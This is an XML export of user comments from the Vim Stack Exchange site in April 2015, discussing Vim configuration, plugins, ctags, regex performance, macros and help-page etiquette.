  <row Id="3039" PostId="2876" Score="0" Text="Hmm interesting, sounds like this is something tags related. The top line that takes the most time has methods from my other projects. &#xA;&#xA;`TOTAL      COUNT  MATCH   SLOWEST     AVERAGE   NAME               PATTERN&#xA;  0.129674   247    182     0.002365    0.000525  rubyMethodNameTag  \C\&lt;\%(roi\|paginate\|admin_index_attributes\|facilities\|manager\|net_price?\ ....` – this is clearly from the other folder. Disable tags?" CreationDate="2015-04-10T08:24:33.303" UserId="237" />
  <row Id="3040" PostId="2876" Score="0" Text="Do you use a plugin that highlights tags, such as _vim-easytags_? That might indeed cause the slowdown." CreationDate="2015-04-10T08:27:22.187" UserId="970" />
  <row Id="3041" PostId="2876" Score="0" Text="Yep, disabled it, not the numbers are sane again. Thanks." CreationDate="2015-04-10T08:29:18.060" UserId="237" />
  <row Id="3042" PostId="2876" Score="0" Text="Hmm now it's acting up again, this time its: `0.121880   2078   54      0.002260    0.000059  rubySymbol         []})\&quot;':]\@&lt;!\%(\h\|[^\x00-\x7F]\)\%(\w\|[^\x00-\x7F]\)*[!?]\=:[[:space:],]\@=&#xA;  ` – Anything I can do about it?" CreationDate="2015-04-10T09:42:48.763" UserId="237" />
  <row Id="3043" PostId="2876" Score="0" Text="It might be the new regexp engine; try `:set regexpengine=1` (best in a new Vim instance, before opening the Ruby file)." CreationDate="2015-04-10T09:54:01.197" UserId="970" />
  <row Id="3044" PostId="2876" Score="0" Text="I'll add it to `.vimrc` and see if it is going to change anything" CreationDate="2015-04-10T10:27:57.690" UserId="237" />
  <row Id="3045" PostId="2877" Score="2" Text="You can try something like `:!node %`. This will shell out to the external `node` program, passing the current filename as an argument. Output will be displayed on the screen, and you can press Enter to dismiss it." CreationDate="2015-04-10T10:39:18.987" UserId="64" />
  <row Id="3046" PostId="2874" Score="1" Text="Note that this won't work correctly for systems which use something other than `\n` for newline.  `systemlist()` only removes the `\n`, not any `\r`." CreationDate="2015-04-10T14:12:57.660" UserId="15" />
  <row Id="3047" PostId="2883" Score="2" Text="You can't disable it, but you can `:set wrap`" CreationDate="2015-04-10T16:19:44.343" UserId="865" />
  <row Id="3048" PostId="2883" Score="1" Text="Can you give an example (and screenshots), please?" CreationDate="2015-04-10T18:58:15.647" UserId="970" />
  <row Id="3049" PostId="2883" Score="0" Text="@IngoKarkat I added the demo." CreationDate="2015-04-10T20:52:05.577" UserId="1687" />
  <row Id="3050" PostId="2885" Score="0" Text="Hi, thanks for your reply. Do you know some lightweight solutions? Is there any way just to modify the .vimrc file since plug-in may be inconvenient for switching platform/machine." CreationDate="2015-04-10T21:10:07.920" UserId="1080" />
  <row Id="3051" PostId="2883" Score="0" Text="It looks like the horizontal scrolling is off because of `'conceal'`. That would also explain the messed up alignment." CreationDate="2015-04-10T21:54:02.867" UserId="64" />
  <row Id="3052" PostId="2883" Score="0" Text="@tommcdo Yes, that's what I think too - that's why I'd like to disable it. The visible buffer size actually is the whole buffer content, and if I move the cursor behind 1/2 of the (visible) buffer, vim scrolls because I traveled more columns than the window height. This is not necessary." CreationDate="2015-04-10T22:17:04.007" UserId="1687" />
  <row Id="3053" PostId="2883" Score="2" Text="@Enuy, what I mean is that the lines are actually *longer* than the window width, but some text (the bash-like color codes) are concealed. So, Vim thinks it's already reached the edge of the window, but visually it has not. I'd say this qualifies as a bug." CreationDate="2015-04-10T22:21:22.227" UserId="64" />
  <row Id="3054" PostId="2883" Score="1" Text="@tommcdo Yes, I understand what you mean. There is a similiar issue with wrapping lines when only concealed parts at the end of the line are the cause of wrapping and it got WONTFIX from Bram: https://code.google.com/p/vim/issues/detail?id=260" CreationDate="2015-04-10T22:24:43.680" UserId="1687" />
  <row Id="3055" PostId="2883" Score="0" Text="That's why I am searching for an alternative solution - to disable horizontal scrolling altogether." CreationDate="2015-04-10T22:25:13.890" UserId="1687" />
  <row Id="3056" PostId="2883" Score="1" Text="The closest I can think of is if you're in a terminal, you could use `&lt;c-s&gt;` to suspend the terminal so that the screen does not update. You could then blindly make changes and go back to the beginning of the line and hit `&lt;c-q&gt;` to resume. Other perhaps-not-helpful options: ensure that the same number of concealed characters are between every visible character or widen the window." CreationDate="2015-04-10T23:03:26.813" UserId="680" />
  <row Id="3058" PostId="2893" Score="0" Text="The line numbers are there so you could type `114gg` too jump to the second entry. Though I guess that only works if its your current buffer." CreationDate="2015-04-11T07:21:08.353" UserId="895" />
  <row Id="3059" PostId="2894" Score="2" Text="For your third option, it may help that `&lt;C-i&gt;` is the same as `&lt;Tab&gt;` in most terminal emulators." CreationDate="2015-04-11T11:36:27.640" UserId="64" />
  <row Id="3060" PostId="2892" Score="0" Text="Ahh great! `:help map_bar` is what I needed. Thanks. That logic I posted is a little off for the behavior I want so I might have to end up using logical and instead but your solution does let me use `||` so I'll accept it as the answer." CreationDate="2015-04-11T15:07:31.600" UserId="200" />
  <row Id="3061" PostId="2891" Score="1" Text="Yep, that's how it's done. You could pass the range without explicit arguments, see `:h function-range-example`, and use `setline()` instead of deleting and using registers." CreationDate="2015-04-11T18:31:27.593" UserId="970" />
  <row Id="3062" PostId="2891" Score="0" Text="Thank you @IngoKarkat. Vim has a lot of functions that save you from doing a lot of work and it's quite difficult to find them if you didn't use them before." CreationDate="2015-04-11T19:36:27.093" UserId="1690" />
  <row Id="3064" PostId="2897" Score="0" Text="Vim has tags support built-in. You don't need any third-party plugins (other than ctags to generate the tags file of course). [See Effortless Ctags With Git](http://tbaggery.com/2011/08/08/effortless-ctags-with-git.html) article by Tim Pope. I use this and it works wonders. Also see `:help tag-commands` to jump to a tag. I consider ctags pretty essential when working with Vim. It makes navigation super simple, and you can even autocomplete with `:help i_Ctrl-x_Ctrl-]`!" CreationDate="2015-04-12T09:41:05.013" UserId="246" />
  <row Id="3065" PostId="2897" Score="0" Text="Care to add anything here http://vi.stackexchange.com/questions/2630/how-to-set-up-tags-properly/ ?" CreationDate="2015-04-12T10:49:12.913" UserId="237" />
  <row Id="3068" PostId="2899" Score="0" Text="Just disabled `easytags` plugin that was slowing vim down http://vi.stackexchange.com/a/2897/237 and switched to using git hooks as suggested by tpope" CreationDate="2015-04-13T05:06:10.163" UserId="237" />
  <row Id="3069" PostId="2912" Score="10" Text="You can also do `10&lt;C-a&gt;` to add 10 or `r2` to replace the 1 with a 2." CreationDate="2015-04-14T01:32:00.547" UserId="15" />
  <row Id="3070" PostId="2914" Score="0" Text="Something isn't right here, but I'll keep that idea in mind, maybe it can be improved. It should be jumping to the first digit on the current line if any and operate on it. Preferably be mappable to `&lt;c-a&gt;/&lt;c-x&gt;` also." CreationDate="2015-04-14T03:54:14.000" UserId="237" />
  <row Id="3072" PostId="2913" Score="0" Text="I just want text to not move. Why it is doing that in the first place? I thought there is some setting that can improve said behaviour." CreationDate="2015-04-14T04:07:50.093" UserId="237" />
  <row Id="3073" PostId="2913" Score="0" Text="when the window is resized (or split in this case) the cursor is moved to the center of the buffer. Not sure you can do anything besides make split do something different." CreationDate="2015-04-14T04:18:10.370" UserId="895" />
  <row Id="3074" PostId="2906" Score="0" Text="The `autoindent` in the modeline is not necessary, since it is already set by the indentation plugin." CreationDate="2015-04-14T06:58:28.273" UserId="21" />
  <row Id="3075" PostId="2916" Score="0" Text="The fact that it disregards negative number is fine, in fact the default behaviour seemed strange to me. I think it looks much better with `:noh` as well. But the real problem is that it can't use cursor position as a base and thus you can increment only the first digit in the line." CreationDate="2015-04-14T08:38:15.370" UserId="237" />
  <row Id="3076" PostId="2914" Score="0" Text="The updated version. Now jumps forward to the next number or if you are currently over a digit allows you to increment it." CreationDate="2015-04-14T11:56:27.997" UserId="895" />
  <row Id="3077" PostId="2880" Score="2" Text="Does the user you're logged in as have permissions to write in the `.cache` directory? Does that directory exist? Have you tried creating it?" CreationDate="2015-04-14T13:39:22.510" UserId="343" />
  <row Id="3078" PostId="2921" Score="0" Text="This might be it. How can I change this setting? `:set viminfo=:1000` will do?" CreationDate="2015-04-14T14:45:19.337" UserId="1055" />
  <row Id="3079" PostId="2921" Score="1" Text="That would be a non-default value. Check with `:verbose set viminfo?` where this got set, and best change that location. As this option uses a set of values, it's best to use `:set viminfo-=:42 | set viminfo+=:1000` to modify it." CreationDate="2015-04-14T15:03:56.067" UserId="970" />
  <row Id="3080" PostId="2921" Score="0" Text="obviously I have to expand set of values using `+=` instead of just overwriting it. Using verbose I got: `Last set from ~/.vimrc` after some default values. I don't have any setting changing `viminfo` behaviour, so I don't know what to change there. I'll just add this line with `:1000` parameter and accept your answer when I notice increase in history size." CreationDate="2015-04-14T16:54:15.577" UserId="1055" />
  <row Id="3081" PostId="2923" Score="0" Text="Are you asking how to enter visual mode and select a search pattern?" CreationDate="2015-04-14T19:16:53.577" UserId="895" />
  <row Id="3082" PostId="2923" Score="0" Text="Yes. Only not manually, but from a script." CreationDate="2015-04-14T19:51:11.933" UserId="1378" />
  <row Id="3083" PostId="2924" Score="0" Text="Unfortunately this code doesn't work from autocommand. But the variant from the previous answer does. Can't tell for sure why." CreationDate="2015-04-14T20:11:21.267" UserId="1378" />
  <row Id="3084" PostId="2925" Score="0" Text="I needed to select text in autocommand, and this code works. Thanks!" CreationDate="2015-04-14T20:13:25.050" UserId="1378" />
  <row Id="3085" PostId="2924" Score="0" Text="Whoops, forgot to escape `&lt;CR&gt;`. My solution is now virtually the same as jecxjo 's, except the function/command and slightly different interpretation of the problem. I'll leave it here as we described things slightly differently." CreationDate="2015-04-14T20:51:06.627" UserId="680" />
  <row Id="3086" PostId="2927" Score="3" Text="Just let me add: I use a favourite keymapping for saving, and I have bound to it `:update` instead of `:write` to obtain the Original Poster requirement." CreationDate="2015-04-14T21:10:05.527" UserId="311" />
  <row Id="3087" PostId="2931" Score="1" Text="Related: Also see Vim's `-p` option to open each file in different tab pages." CreationDate="2015-04-15T01:54:01.213" UserId="246" />
  <row Id="3088" PostId="2929" Score="1" Text="This needs a space between `w` and `&lt;c-r&gt;`." CreationDate="2015-04-15T01:54:12.963" UserId="268" />
  <row Id="3089" PostId="2929" Score="0" Text="Oops, typos. Fixing..." CreationDate="2015-04-15T02:01:15.333" UserId="895" />
  <row Id="3090" PostId="2914" Score="0" Text="Yes! This is amazing, thank you! I don't understand why the question was downvoted though, this was annoying me since the day one and apparently many people redefine `&lt;c-a&gt;` and `&lt;c-x&gt;` to something else because the default behaviour is not that useful." CreationDate="2015-04-15T04:39:31.087" UserId="237" />
  <row Id="3091" PostId="2914" Score="0" Text="I could see it gets downvoted because the question was for something very specific and the original question sort of changed along the way...the need to jump to the first number. That aside, I actually use `&lt;c-a&gt;` and `&lt;c-x&gt;` a lot. Any time I update a version or increase a range variable, I just `[N]&lt;c-a&gt;` instead of deleting and replacing." CreationDate="2015-04-15T05:13:26.823" UserId="895" />
  <row Id="3093" PostId="2933" Score="0" Text="Hopefully people don't deem it off-topic, because a similar one was asked there http://vi.stackexchange.com/questions/2455/what-additional-features-do-gvim-and-or-macvim-offer-compared-to-vim-inside-a-te" CreationDate="2015-04-15T06:20:10.797" UserId="1315" />
  <row Id="3094" PostId="2933" Score="0" Text="A lot of Vim users never use the TUI version and are more comfortable with GUI tools. Get over it." CreationDate="2015-04-15T07:10:29.183" UserId="54" />
  <row Id="3096" PostId="2933" Score="0" Text="@romainl Using GUI version is fine... It has some other extra features. But I don't see any benefit of using GUI search tool though." CreationDate="2015-04-15T09:48:10.290" UserId="1315" />
  <row Id="3097" PostId="2939" Score="1" Text="OH MY GOD! That's just so perfect, I wish I could up your answer more than one time." CreationDate="2015-04-15T10:15:09.893" UserId="1725" />
  <row Id="3098" PostId="6" Score="0" Text="Bram was probably talking about **[this event](https://twitter.com/pdfkungfoo/status/526097727579750400)**" CreationDate="2015-04-15T10:43:17.330" UserId="1727" />
  <row Id="3099" PostId="2942" Score="0" Text="I [beat you to this conclusion](http://vi.stackexchange.com/a/2941/267) by about a minute, but thanks anyway. I'm not sure why I ever assumed otherwise. I guess I was under the impression that it was doing some sort of Unicode character combining magic to overlay the separator in the edge of the character space, but I realize now that I think about it consciously how ridiculous that would be." CreationDate="2015-04-15T12:31:45.757" UserId="267" />
  <row Id="3100" PostId="2869" Score="0" Text="Thank you. This seems seems to work when I write a new directive. But if I try to reindent an old one, say by doing `gg=G`, it leaves the directives unchanged. How could I make it work in both cases?" CreationDate="2015-04-15T15:19:23.077" UserId="356" />
  <row Id="3101" PostId="2935" Score="0" Text="Thanks.  I suspected the answer was somewhere along those lines, although i couldn't quite work out the sequence of commands to get it right.  I'm not too worried about the previous window, but the noautocmd warning was definitely helpful." CreationDate="2015-04-15T16:17:55.573" UserId="1688" />
  <row Id="3102" PostId="2945" Score="0" Text="Wow, and I already have that installed! Never knew it did that!" CreationDate="2015-04-15T16:29:27.367" UserId="1406" />
  <row Id="3103" PostId="2945" Score="1" Text="Might want to look at [Effortless Ctags with Git](http://tbaggery.com/2011/08/08/effortless-ctags-with-git.html). I have also heard good things about the [Gutentags](https://github.com/ludovicchabant/vim-gutentags) plugin." CreationDate="2015-04-15T16:49:51.377" UserId="778" />
  <row Id="3104" PostId="2946" Score="0" Text="Wow. Great hunting!" CreationDate="2015-04-15T17:41:25.890" UserId="673" />
  <row Id="3105" PostId="2931" Score="0" Text="BTW, how do you switch among tabs when using `-p` option? I tried `ctrl`+`PageDown`, `ctrl`+`tab` and `ctrl`+`w`. No one works." CreationDate="2015-04-15T22:20:53.137" UserId="1080" />
  <row Id="3106" PostId="2931" Score="1" Text="@user3813057 you can use the tab navigation commands. For example `:help gt` and `:help gT`" CreationDate="2015-04-15T22:45:02.730" UserId="246" />
  <row Id="3107" PostId="2953" Score="0" Text="That does work, thank you! I just can't figure out why... everything gets a fold level of 1 in my example, so there should just be one fold containing all the lines, right? Why does it do what I want?" CreationDate="2015-04-16T12:41:39.407" UserId="1296" />
  <row Id="3108" PostId="2953" Score="1" Text="The trick is the `&gt;1`, which instructs Vim to start a _new_ fold (even if the level is the same as on the line before)." CreationDate="2015-04-16T13:15:53.367" UserId="970" />
  <row Id="3109" PostId="2955" Score="0" Text="Related question: http://vi.stackexchange.com/questions/1874/how-can-i-get-my-windows-back-into-a-grid-formation." CreationDate="2015-04-16T13:32:46.120" UserId="13" />
  <row Id="3110" PostId="2953" Score="0" Text="Oh ok, I did not see that this is possible in foldexpr. Thanks!" CreationDate="2015-04-16T13:34:46.303" UserId="1296" />
  <row Id="3113" PostId="2959" Score="2" Text="Disabling signs in syntastic: `let g:syntastic_enable_signs = 0`." CreationDate="2015-04-16T14:59:58.227" UserId="1577" />
  <row Id="3115" PostId="2961" Score="0" Text="It might be possible to go from vim to pdf, but the other way around requires functionality in the pdf view to send back some sort of message to vim reporting where in the tex file to jump." CreationDate="2015-04-16T15:48:45.367" UserId="895" />
  <row Id="3117" PostId="2958" Score="0" Text="&quot;For longer files, I understand these flags would probably replace overwrite the numbers in the lines they appear. I wouldn't have a problem with that.&quot;&#xA;&#xA;You could consider not showing the number column or at least making it thinner (`set numberwidth=2`). I know it doesn't solve your problem, but I figure it doesn't hurt to mention." CreationDate="2015-04-16T16:14:36.760" UserId="680" />
  <row Id="3118" PostId="2958" Score="0" Text="Make your window 2 columns wider and permanently enable signs? :)" CreationDate="2015-04-16T18:00:00.913" UserId="609" />
  <row Id="3119" PostId="2963" Score="1" Text="Even though the location is not static, for a given checkout they are fixed to a specific location?  I'm wondering if you couldn't setup a sort of &quot;Per Project vimrc&quot; but instead set one up per checkout." CreationDate="2015-04-16T19:11:52.340" UserId="895" />
  <row Id="3120" PostId="2963" Score="2" Text="See http://vi.stackexchange.com/questions/2944/can-i-load-different-tags-per-project - fugitive.vim + .git/tags = different tags per project" CreationDate="2015-04-16T22:35:54.067" UserId="609" />
  <row Id="3121" PostId="292" Score="0" Text="I found that Obsession didn't remember vertical splits, whereas mksession did. I've only been messing about with this tonight though, is there something that I've missed?" CreationDate="2015-04-17T00:07:15.240" UserId="1443" />
  <row Id="3122" PostId="2947" Score="1" Text="This does not provide an answer to the question. To critique or request clarification from an author, leave a comment below their post - you can always comment on your own posts, and once you have sufficient [reputation](http://vi.stackexchange.com/help/whats-reputation) you will be able to [comment on any post](http://vi.stackexchange.com/help/privileges/comment)." CreationDate="2015-04-17T03:21:17.097" UserId="15" />
  <row Id="3123" PostId="2914" Score="0" Text="Sorry, me again, is there a way to force it to ignore the minus sign? Most of the time I need to change something like '.col-5' to '.col-6' and it's not helping." CreationDate="2015-04-17T10:10:46.210" UserId="237" />
  <row Id="3124" PostId="2403" Score="0" Text="Has anyone figured a way to get completion working for both python 2 and 3? We still use both unfortunately." CreationDate="2015-04-17T12:10:14.903" UserId="1764" />
  <row Id="3125" PostId="2914" Score="1" Text="It would be possible but would be a much larger set of functions. The current implementation takes advantage of `&lt;c-a&gt;` and `&lt;c-x&gt;` which would need to be dropped for a function that does the same but ignores the dash." CreationDate="2015-04-17T13:31:59.533" UserId="895" />
  <row Id="3126" PostId="2961" Score="0" Text="Such a thing exists (you can pass --synctex=1 to pdflatex, and it is understood by some PDF viewers). I don't know to feed that information back to vim however." CreationDate="2015-04-17T14:08:18.323" UserId="92" />
  <row Id="3127" PostId="2962" Score="0" Text="This isn't quite what I want... with texshop, it runs latex on your whole document, opens the PDF viewer, and then moves to the line in the PDF which lines up with the currently open line in vim." CreationDate="2015-04-17T14:14:26.213" UserId="92" />
  <row Id="3128" PostId="2961" Score="0" Text="It looks like there was a synctex + vim discussion over at the Tex site (note its for Linux but Mac shouldn't be much different) http://tex.stackexchange.com/questions/2941/how-to-setup-synctex-with-vim-pdflatex-and-an-open-source-pdf-viewer-under-linu" CreationDate="2015-04-17T14:14:31.257" UserId="895" />
  <row Id="3129" PostId="2962" Score="0" Text="That's much simpler to achieve but the moving of the PDF view might be a bit tricky. vim has a built in set of compiler functions. Check out `:h compiler-tex`. After setting up a few options you can basically call `:make %` and it will compile your latex document." CreationDate="2015-04-17T14:19:49.107" UserId="895" />
  <row Id="3131" PostId="2977" Score="0" Text="That just causes unnecessary buffer reloads; better open the files with the right encoding from the start." CreationDate="2015-04-17T14:32:24.623" UserId="970" />
  <row Id="3133" PostId="2905" Score="1" Text="In single line form: `command! -bang -nargs=+ Bufgrep execute 'vimgrep&lt;bang&gt;&lt;args&gt; ' . join(map(filter(range(1, bufnr('$')), 'buflisted(v:val)'), '&quot;#&quot;.v:val'), ' ')`. Usage: `:Bufgrep/foo/`" CreationDate="2015-04-17T16:33:03.187" UserId="778" />
  <row Id="3134" PostId="2947" Score="0" Text="I tried to comment on the original post but I couldn't. The only alternative I had was the the one I chose @jamessan" CreationDate="2015-04-17T18:05:32.817" UserId="1735" />
  <row Id="3135" PostId="2980" Score="0" Text="Another strange behaviour: When the URI ends in a `/`, it's first downloaded (with `curl`) and then opened. Removing the trailing `/`, the URI is directly opened in the browser." CreationDate="2015-04-17T18:10:42.037" UserId="1631" />
  <row Id="3136" PostId="2982" Score="0" Text="Doesn't work - this is the same example as linked in the OP as well. I don't think it takes into account the line changes / creations that are done in the example. Have you tested this?" CreationDate="2015-04-17T18:29:56.190" UserId="1443" />
  <row Id="3137" PostId="2982" Score="1" Text="Was having issues loading the link for a moment so I posted the quick answer. You are correct, the line changes affect the `{range}` portion of the `normal` command." CreationDate="2015-04-17T19:04:34.793" UserId="895" />
  <row Id="3138" PostId="2982" Score="0" Text="Using the {count}@&lt;register&gt; technique works perfectly fine for me. If you don't feel like counting, yank the selection into an empty temporary buffer (or use NrrwRgn) and do 999@&lt;register&gt;." CreationDate="2015-04-17T19:06:24.887" UserId="680" />
  <row Id="3139" PostId="2982" Score="0" Text="@jecxjo I'm aware of running it with `{count}@register`, the question was how to apply this to a selection without having to know the exact amount of times it had to be run. Cheers" CreationDate="2015-04-17T19:08:37.860" UserId="1443" />
  <row Id="3140" PostId="2982" Score="0" Text="@MattBoehm cheers, yes the point of the OP is that counting isn't always practical (it wasn't for me earlier) whereas being able to run something with a visual block (or visually selecting the entire file) would be simpler as it would save the recursion looping the macro back around. Would be good if you could make a post explaining what you mentioned. Thanks" CreationDate="2015-04-17T19:10:30.173" UserId="1443" />
  <row Id="3141" PostId="2982" Score="0" Text="@baxx will do. Was only hesitant because I have to clean up my macro to remove custom mappings" CreationDate="2015-04-17T19:11:35.523" UserId="680" />
  <row Id="3142" PostId="2982" Score="1" Text="Without writing a function that identifies the line movement, you can't. Even though the `normal` command is thought of being triggered in parallel it really isn't. The range is changed into line numbers and the macro is run on each line. Since the lines move you can't run it in parallel mode." CreationDate="2015-04-17T19:14:02.343" UserId="895" />
  <row Id="3143" PostId="2985" Score="0" Text="Thanks! Alternatively `dwx` instead of `df)`" CreationDate="2015-04-17T20:51:11.937" UserId="40" />
  <row Id="3144" PostId="2980" Score="2" Text="&quot;path name&quot; is defined by the `'isfname'` option, which doesn't include `?` as a valid file name character by default.  Changing this option requires care because it can't be set local to the buffer.  Unless NetRW is changing this option, then that explains why the OPs URLs don't work with `gx`.  Maybe there's a difference in NetRW versions being used, which would explain the different behavior Carpetsmoker sees." CreationDate="2015-04-17T21:28:00.007" UserId="15" />
  <row Id="3145" PostId="2963" Score="0" Text="@jecxjo This would work, but would be difficult for me to set up since I work on a large multi-developer project controlled by mostly emacs users, who would not allow me to commit the .vimrc to the top-level directory." CreationDate="2015-04-17T21:29:34.617" UserId="1747" />
  <row Id="3146" PostId="2968" Score="0" Text="This looks good, but I get &quot;E734: Wrong variable type for +=&quot; when I include it." CreationDate="2015-04-17T21:40:09.733" UserId="1747" />
  <row Id="3147" PostId="2985" Score="0" Text="Huh.. I didn't know I could do ``!" CreationDate="2015-04-17T22:06:41.167" UserId="475" />
  <row Id="3148" PostId="2985" Score="0" Text="It is the &quot;last source of a jump&quot; location." CreationDate="2015-04-17T22:41:56.050" UserId="895" />
  <row Id="3149" PostId="2990" Score="0" Text="You can continue to add to your search and press tab again." CreationDate="2015-04-18T02:11:58.520" UserId="895" />
  <row Id="3150" PostId="2987" Score="0" Text="After restarting vim with everything commented out in `.vimrc` except nerdtree... everything is back to normal. I don't have any explanation for this at the moment, but it fixed itself." CreationDate="2015-04-18T05:49:47.333" UserId="237" />
  <row Id="3151" PostId="2987" Score="0" Text="Sorry it is not consistent actually. I need to investigate it further." CreationDate="2015-04-18T06:31:13.597" UserId="237" />
  <row Id="3152" PostId="2979" Score="3" Text="Anybody, if you want this to be merged, please cheer for it at vim-dev (and also reply back how well this works for you)" CreationDate="2015-04-18T12:06:34.080" UserId="71" />
  <row Id="3154" PostId="462" Score="1" Text="To force, try: `:bufdo! e`." CreationDate="2015-04-18T21:22:10.250" UserId="467" />
  <row Id="3155" PostId="2608" Score="0" Text="To use glob patterns (`**`), you need to have `globstar` set, see: [Match all files under all nested directories with shell globbing](http://stackoverflow.com/q/4349082/55075)." CreationDate="2015-04-18T22:53:44.223" UserId="467" />
  <row Id="3156" PostId="2999" Score="1" Text="Thanks, I didn't think of single-quote, it was too close:) Regarding glob pattern (`**`) it works for bash and zsh, only when `globstar` is set, so sometimes it's not set by default. And it include also the folders. But it's a great substitute:) This one `{,**/}*.*` will exclude folders (bash4)." CreationDate="2015-04-18T23:25:37.813" UserId="467" />
  <row Id="3157" PostId="2999" Score="0" Text="Yep, you're right, `args **` does include folders. You can always give it extensions (`:args *.h *.cpp` etc) to search for, so that it's both faster and will only find files. Amended my answer though." CreationDate="2015-04-18T23:48:31.617" UserId="246" />
  <row Id="3158" PostId="2999" Score="0" Text="Re: globstar, I've performed some small testing in [here](http://stackoverflow.com/a/29731174/55075)." CreationDate="2015-04-19T14:36:26.163" UserId="467" />
  <row Id="3160" PostId="3003" Score="0" Text="Have you tried to escape the character with '/'?" CreationDate="2015-04-19T17:07:30.210" UserId="21" />
  <row Id="3161" PostId="3004" Score="0" Text="I'm accepting this as the answer, but in case anyone else stumbles into this the way I did, here's a link to [the basic solution](http://vi.stackexchange.com/questions/118/how-can-i-use-vims-spellcheck-with-smart-quotes) I ended up using to resolve my issue." CreationDate="2015-04-19T22:55:34.310" UserId="1008" />
  <row Id="3162" PostId="172" Score="0" Text="If you choose to go the `:mkspell!` route, you may also want to filter out words that are intended for irrelevant regions." CreationDate="2015-04-19T22:57:09.023" UserId="1008" />
  <row Id="3163" PostId="3002" Score="0" Text="You didn't read my question carefully. And, the accepted answer already mentions `:args`." CreationDate="2015-04-20T01:59:30.043" UserId="578" />
  <row Id="3164" PostId="3003" Score="0" Text="Please, avoid the XY problem and wasting everyone's time by asking about your goal, not about your failed attempts to reach that goal." CreationDate="2015-04-20T05:16:02.540" UserId="54" />
  <row Id="3165" PostId="3013" Score="1" Text="`:help string-functions`, seriously." CreationDate="2015-04-20T07:03:37.477" UserId="54" />
  <row Id="3166" PostId="3013" Score="1" Text="@romainl thanks for the tip but next time take into account that maybe I've been programming in vimscript for a couple of days and for what I know,  `string-functions` is not a global standard man page for every language, seriously." CreationDate="2015-04-20T07:25:21.390" UserId="1690" />
  <row Id="3167" PostId="3013" Score="0" Text="http://vi.stackexchange.com/a/2137/54" CreationDate="2015-04-20T07:35:11.847" UserId="54" />
  <row Id="3168" PostId="3013" Score="2" Text="I agree with @Jcao02, prior knowledge of the entirety of Vim help pages are not a requirement of this site. And I would classify `:help string-functions` as slightly obscure. Also, some scripting languages like python and perl use `chr()` and `ord()` functions to convert to ascii/character. So searching with these terms still wouldn't show up the `nr2char` and `char2nr` functions either. I think @romainl's comment should be posted as an answer instead." CreationDate="2015-04-20T07:38:07.177" UserId="246" />
  <row Id="3169" PostId="3013" Score="2" Text="I have to agree with romainl: it's very important to know how to navigate vim help pages. My first shell classes taught me `man man`. `:help :help` is equally important. But vim documentation is quite massive and hard to figure the first years. Thus tricks like `:h function^D` give us entries points. Here it would be `:h functions` (/`:h string-functions`). Then, it's easy to understand what's doing what. Even if we are used to other languages. We can always give the information (it's what we're doing most of the time), but teaching how to _fish_ it is more important -- you know the proverb..." CreationDate="2015-04-20T10:24:33.637" UserId="626" />
  <row Id="3170" PostId="3002" Score="0" Text="@JustinM.Keyes Thanks for your points. Wildcard should work by default and this is the only answer which says that it should work in 7.4 (as I had exactly the same error before the upgrade). Using `args` is only the workaround, but further more it shows you how to use the shell expansion within vim it-self in case further users wants to use it for more complex solutions, by using `find`, such as [this one](http://vi.stackexchange.com/q/2997/467). So I think it gives some additional value to your question. So I hope it's fine with you." CreationDate="2015-04-20T10:42:01.657" UserId="467" />
  <row Id="3171" PostId="3017" Score="3" Text="And to obtain the complete list, you have this oneliner `echo join(map(filter(copy(range(1, bufnr('$'))), 'buflisted(v:val)'), '&quot;  &quot;.fnamemodify(bufname(v:val), &quot;:p&quot;)'), &quot;\n&quot;)`. However, if you want to display the other information (displayed by `:buffer`), prefer a loop to build the _indicators_ string." CreationDate="2015-04-20T13:08:12.493" UserId="626" />
  <row Id="3172" PostId="3003" Score="0" Text="What is the XY problem?  Apologies if I deeply offended you in any way.  I thought the `iskeyword` argument was the most direct solution for this.  In fact, I'm still not sure what its purpose could be other than to affect things like what counts as a word for spelling." CreationDate="2015-04-20T16:44:13.553" UserId="1008" />
  <row Id="3173" PostId="3018" Score="0" Text="Not directly an answer to your question, but you might still want to look at [par](http://www.nicemice.net/par/).  Absolutely outstanding in my experience, provided that you take your time to digest the manual." CreationDate="2015-04-20T18:39:44.640" UserId="1577" />
  <row Id="3174" PostId="3008" Score="0" Text="Sounds to me like its a bug." CreationDate="2015-04-20T19:22:30.137" UserId="895" />
  <row Id="3175" PostId="3002" Score="0" Text="I never had an issue with `vim */foo`, and there's no way that could be related to the Vim version, because that's a *shell* feature." CreationDate="2015-04-20T21:32:25.607" UserId="578" />
  <row Id="3176" PostId="3015" Score="2" Text="Thanks for the tip, but again, there are unnecessary comments in that answer. If you're going to answer a question, be serious about it and stop using sarcasm and irony. If you can't avoid it, just ignore the question and don't answer at all" CreationDate="2015-04-21T00:10:18.990" UserId="1690" />
  <row Id="3177" PostId="3015" Score="3" Text="@romainl, this is exactly the answer you should have posted, rather than a comment. I didn't say don't tell users how to search the help pages, in fact, I was saying tell them ***how*** to. Posting this as an answer and showing users how to search the help pages is better than posting a comment saying &quot;help string-functions, seriously&quot;. How do new users learn from that type of comment? You have to teach them something." CreationDate="2015-04-21T02:30:49.463" UserId="246" />
  <row Id="3178" PostId="3013" Score="1" Text="@LucHermitte I would argue that just posting `:help string-functions` is not showing how to fish. It's more like giving someone the bait and not teaching them to fish at all. Posting *how* they can search for functions, is teaching them to fish." CreationDate="2015-04-21T02:33:17.293" UserId="246" />
  <row Id="3179" PostId="3008" Score="2" Text="`vi -es +'bufdo! %s/\s\+$//e' -cxa ...` works here" CreationDate="2015-04-21T04:59:40.780" UserId="188" />
  <row Id="3180" PostId="3015" Score="0" Text="@akshay, I already posted [an extensive QA](http://vi.stackexchange.com/a/2137/54) on the subject. The OP didn't even try to look for an answer on his own before turning to others. He doesn't want to learn, he seems to only want to be spoon-fed, like so many stack exchange users. Sarcasm is the only thing people like that deserve." CreationDate="2015-04-21T07:27:18.900" UserId="54" />
  <row Id="3181" PostId="3021" Score="0" Text="I am unable to reproduce this problem using the Vim 7.3 that comes with OS X 10.9." CreationDate="2015-04-21T08:00:41.720" UserId="24" />
  <row Id="3182" PostId="3021" Score="1" Text="How about `:au CursorHoldI` or `:au CursorMovedI` ( both ending with uppercase i )?" CreationDate="2015-04-21T09:21:39.503" UserId="1782" />
  <row Id="3183" PostId="3021" Score="0" Text="Please show exact Vim version" CreationDate="2015-04-21T19:13:02.953" UserId="71" />
  <row Id="3184" PostId="3021" Score="0" Text="I can't reproduce on vim 7.4.448" CreationDate="2015-04-21T20:20:00.620" UserId="306" />
